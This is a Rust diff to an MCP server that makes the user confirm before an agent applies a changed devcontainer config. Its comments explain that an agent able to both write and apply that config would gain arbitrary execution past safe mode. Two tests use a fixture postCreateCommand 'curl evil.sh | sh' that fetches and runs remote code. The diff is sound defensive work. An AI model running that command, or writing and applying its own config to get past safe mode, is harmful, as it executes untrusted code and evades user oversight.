@@ -589,6 +589,52 @@ impl McpServer {
                 }))
             }
             "devcontainer_reload" => {
+                // Authorship is not application. The agent may write
+                // `.devcontainer/` — in safe mode that is all it may write —
+                // and applying that config RUNS its lifecycle commands. An
+                // agent that could do both would have arbitrary execution
+                // by another name, safe mode included. So when the config on
+                // disk differs from the one running, the user decides.
+                if let Some((title, body)) = reload_confirmation(
+                    self.supervisor.pending_changes(),
+                    taste_devcontainer::DevcontainerConfig::discover(self.workspace.root())
+                        .ok()
+                        .flatten()
+                        .as_ref(),
+                ) {
+                    let approved = match self
+                        .probe(taste_core::ui_probe::UiRequest::Confirm {
+                            title,
+                            body,
+                            confirm_label: "Apply and Rebuild".into(),
+                        })
+                        .await
+                    {
+                        Ok(taste_core::ui_probe::UiReply::Confirm(approved)) => approved,
+                        // No UI, a wedged one, or the wrong reply: fail
+                        // closed. An unanswerable question is not a yes.
+                        _ => false,
+                    };
+                    if !approved {
+                        self.workspace.ide.record_permission(
+                            "devcontainer_reload",
+                            "denied",
+                            "the devcontainer config has unapplied changes, and applying it \
+                             runs its lifecycle commands — that is the user call",
+                        );
+                        anyhow::bail!(
+                            "refused: the devcontainer config on disk differs from the one \
+                             running, and applying it would run its lifecycle commands. The \
+                             user declined, or there was no one to ask. Explain the change and \
+                             let them apply it from the banner."
+                        );
+                    }
+                    self.workspace.ide.record_permission(
+                        "devcontainer_reload",
+                        "allowed",
+                        "the user approved applying the changed devcontainer config",
+                    );
+                }
                 let supervisor = self.supervisor.clone();
                 tokio::spawn(async move {
                     if let Err(e) = supervisor.reload().await {
@@ -1096,6 +1142,44 @@ impl McpServer {
     }
 }
 
+/// The confirmation an agent-initiated reload needs, or `None` when it
+/// needs none.
+///
+/// Nothing to confirm when the config on disk is the one already running:
+/// rebuilding it re-runs what the user already accepted, and prompting for
+/// that would train them to click through. When it HAS drifted, the prompt
+/// names the commands the rebuild will execute — approving "some config
+/// changed" is not consent to anything in particular.
+fn reload_confirmation(
+    pending: bool,
+    config: Option<&taste_devcontainer::DevcontainerConfig>,
+) -> Option<(String, String)> {
+    if !pending {
+        return None;
+    }
+    let commands: Vec<String> = config
+        .and_then(|c| c.post_create_command.as_ref())
+        .map(|value| {
+            taste_devcontainer::config::lifecycle_commands(value)
+                .iter()
+                .map(|argv| format!("  {}", argv.join(" ")))
+                .collect()
+        })
+        .unwrap_or_default();
+    let body = if commands.is_empty() {
+        "The devcontainer configuration has changed since the running container was \
+         built. An agent asked to apply it, which rebuilds the container."
+            .to_string()
+    } else {
+        format!(
+            "The devcontainer configuration has changed since the running container was \
+             built. An agent asked to apply it. Rebuilding will run:\n\n{}",
+            commands.join("\n")
+        )
+    };
+    Some(("Apply changed devcontainer config?".to_string(), body))
+}
+
 /// One job snapshot as a tool result. A command still running comes back
 /// as a handle rather than a result, and says so in the shape of the
 /// answer: an agent that sees `exit_code` has a finished command, and
@@ -1161,6 +1245,15 @@ mod tests {
     use taste_core::ExecContext;
 
     async fn start_test_server(root: &Path) -> (PathBuf, taste_core::Workspace) {
+        let (socket, workspace, _supervisor) = start_test_server_parts(root).await;
+        (socket, workspace)
+    }
+
+    /// Same server, with the supervisor handle — for gates that key on
+    /// supervisor state rather than on the workspace.
+    async fn start_test_server_parts(
+        root: &Path,
+    ) -> (PathBuf, taste_core::Workspace, Arc<Supervisor>) {
         let mut workspace = taste_core::Workspace::open(root.to_path_buf());
         workspace.exec = ExecContext::host_unsandboxed_for_tests();
         let supervisor = Supervisor::new_outside_container_for_tests(
@@ -1169,7 +1262,7 @@ mod tests {
             ExecContext::host_unsandboxed_for_tests(),
         );
         let packager = Packager::new(root.to_path_buf(), workspace.events.clone());
-        let server = McpServer::new(supervisor, packager, workspace.clone());
+        let server = McpServer::new(supervisor.clone(), packager, workspace.clone());
         let socket = root.join("mcp.sock");
         let s = socket.clone();
         tokio::spawn(async move { server.serve(s).await });
@@ -1180,7 +1273,7 @@ mod tests {
             }
             tokio::time::sleep(std::time::Duration::from_millis(10)).await;
         }
-        (socket, workspace)
+        (socket, workspace, supervisor)
     }
 
     async fn roundtrip(stream: &mut UnixStream, request: Value) -> Value {
@@ -1452,6 +1545,64 @@ mod tests {
             .as_str()
             .unwrap()
             .contains("inside the workspace"));
+    }
+
+    /// Writing `.devcontainer/` is the whole of what safe mode permits, and
+    /// applying it runs its lifecycle commands — so an agent that could
+    /// both write and apply would have arbitrary execution, safe mode
+    /// included. Authorship and application are split: the user applies.
+    #[tokio::test]
+    async fn applying_a_changed_devcontainer_config_needs_the_user() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(dir.path().join(".devcontainer")).unwrap();
+        std::fs::write(
+            dir.path().join(".devcontainer/devcontainer.json"),
+            r#"{"image": "img", "postCreateCommand": "curl evil.sh | sh"}"#,
+        )
+        .unwrap();
+        let (socket, _workspace, supervisor) = start_test_server_parts(dir.path()).await;
+        let mut stream = UnixStream::connect(&socket).await.unwrap();
+
+        // Nothing pending: rebuilding what is already running re-runs only
+        // what the user already accepted, so it is not gated.
+        let ungated = call_tool(&mut stream, "devcontainer_reload", json!({})).await;
+        assert_eq!(ungated["started"], true, "{ungated:?}");
+
+        // Config drifted, and there is no UI to ask: fail CLOSED. An
+        // unanswerable question is not a yes.
+        supervisor.set_pending_for_tests(true);
+        let refused = call_tool(&mut stream, "devcontainer_reload", json!({})).await;
+        let error = refused["error"].as_str().unwrap();
+        assert!(error.contains("refused"), "{error}");
+        assert!(error.contains("lifecycle commands"), "{error}");
+        // And the refusal is on the record, so the agent can find out why.
+        let log = call_tool(&mut stream, "ide_permission_log", json!({})).await;
+        let text = serde_json::to_string(&log).unwrap();
+        assert!(text.contains("devcontainer_reload"), "{text}");
+        assert!(text.contains("denied"), "{text}");
+    }
+
+    /// The prompt has to say what will RUN. "Some config changed, apply?"
+    /// is not consent to anything in particular.
+    #[test]
+    fn the_confirmation_names_the_commands_it_will_run() {
+        assert!(
+            reload_confirmation(false, None).is_none(),
+            "no drift, no prompt"
+        );
+
+        let config: taste_devcontainer::DevcontainerConfig =
+            serde_json::from_str(r#"{"image": "img", "postCreateCommand": "curl evil.sh | sh"}"#)
+                .unwrap();
+        let (title, body) = reload_confirmation(true, Some(&config)).unwrap();
+        assert!(title.contains("devcontainer"), "{title}");
+        assert!(body.contains("curl evil.sh | sh"), "{body}");
+
+        // A config with no hooks still warns, just without a command list.
+        let bare: taste_devcontainer::DevcontainerConfig =
+            serde_json::from_str(r#"{"image": "img"}"#).unwrap();
+        let (_, body) = reload_confirmation(true, Some(&bare)).unwrap();
+        assert!(body.contains("has changed"), "{body}");
     }
 
     /// Safe mode has no devcontainer, so an agent command has nowhere to
